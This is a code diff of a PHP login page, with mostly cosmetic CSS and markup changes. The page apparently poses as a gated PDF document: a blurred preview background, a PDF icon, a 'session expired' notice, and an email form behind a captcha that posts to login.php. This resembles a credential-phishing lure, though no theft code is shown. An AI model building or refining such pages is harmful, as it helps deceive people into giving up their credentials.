@@ -11,7 +11,7 @@ $old_email = $_SESSION['old_email'] ?? '';
 $error = $_SESSION['error_message'] ?? '';
 unset($_SESSION['error_message']);
 
-// Show the "previous session expired" ONLY on FIRST LOAD
+// Show the "previous session expired" ONLY on first load
 $show_expired_message = !isset($_SESSION['viewed_index']);
 $_SESSION['viewed_index'] = true;
 ?>
@@ -24,9 +24,6 @@ $_SESSION['viewed_index'] = true;
 <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
 
 <style>
-/* -------------------------------------------
-   AUTO DARK/LIGHT MODE
--------------------------------------------- */
 :root {
     --card-bg: #f5f5f5;
     --text-color: #222;
@@ -50,13 +47,11 @@ $_SESSION['viewed_index'] = true;
     }
 }
 
-/* -------------------------------------------
-   PAGE BACKGROUND
--------------------------------------------- */
+/* Page and background */
 body {
     margin: 0;
     font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
-    background: #000;
+    background: #111;
     color: var(--text-color);
 }
 
@@ -69,20 +64,23 @@ body {
     overflow: hidden;
 }
 
+/* Background PDF image */
 .doc-background {
     position: absolute;
     inset: 0;
-    filter: blur(6px);
-    transform: scale(1.05);
-    opacity: 0.55;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    overflow: hidden;
 }
 
 .doc-background img {
-    width: 100%;
-    height: 100%;
-    object-fit: cover;
+    max-width: 100%;
+    max-height: 100%;
+    object-fit: contain; /* preserves aspect ratio */
 }
 
+/* Overlay for readability */
 .page-wrapper::before {
     content: "";
     position: absolute;
@@ -90,25 +88,26 @@ body {
     background: var(--overlay-dark);
 }
 
-/* -------------------------------------------
-   CARD
--------------------------------------------- */
+/* Card */
 .login-card {
     position: relative;
     z-index: 2;
-    width: 92%;
-    max-width: 330px;
+    width: 95%;
+    max-width: 320px;
     background: var(--card-bg);
     border-radius: 6px;
-    padding: 24px 22px 28px;
+    padding: 24px 20px 28px;
     box-shadow: 0 18px 45px rgba(0,0,0,0.45);
+    display: flex;
+    flex-direction: column;
+    align-items: center;
 }
 
 /* PDF Icon */
 .doc-icon {
-    width: 44px;
-    height: 44px;
-    margin: 0 auto 10px;
+    width: 42px;
+    height: 42px;
+    margin-bottom: 10px;
 }
 
 .doc-icon-img {
@@ -141,9 +140,10 @@ body {
     font-weight: bold;
 }
 
-/* Fields */
+/* Form fields */
 .field-wrapper {
-    margin-bottom: 14px;
+    width: 100%;
+    margin-bottom: 12px;
 }
 
 .field-wrapper input {
@@ -158,11 +158,12 @@ body {
 
 .field-wrapper input:focus {
     border-color: var(--btn-bg);
+    outline: none;
 }
 
-/* Turnstile size */
+/* Turnstile */
 .cf-turnstile {
-    margin-bottom: 14px;
+    margin-bottom: 12px;
     transform: scale(0.93);
     transform-origin: 0 0;
 }
@@ -172,7 +173,7 @@ body {
     width: 100%;
     padding: 11px;
     background: var(--btn-bg);
-    color: white;
+    color: #fff;
     border: none;
     border-radius: 4px;
     cursor: pointer;
@@ -183,12 +184,11 @@ body {
 }
 </style>
 </head>
-
 <body>
 <div class="page-wrapper">
 
     <div class="doc-background">
-        <img src="assets/background.png" alt="Background">
+        <img src="assets/background.png" alt="Document preview">
     </div>
 
     <div class="login-card">
@@ -207,11 +207,9 @@ body {
             <p class="login-error"><?= htmlspecialchars($error) ?></p>
         <?php endif; ?>
 
-
         <?php if($step == 1): ?>
         <!-- STEP 1: EMAIL + CAPTCHA -->
         <form method="POST" action="login.php">
-
             <div class="field-wrapper">
                 <input type="email" name="email" value="<?= htmlspecialchars($old_email) ?>"
                        placeholder="Enter your email" required>
@@ -236,7 +234,6 @@ body {
 
             <button class="btn-primary">Next</button>
         </form>
-
         <?php endif; ?>
 
     </div>
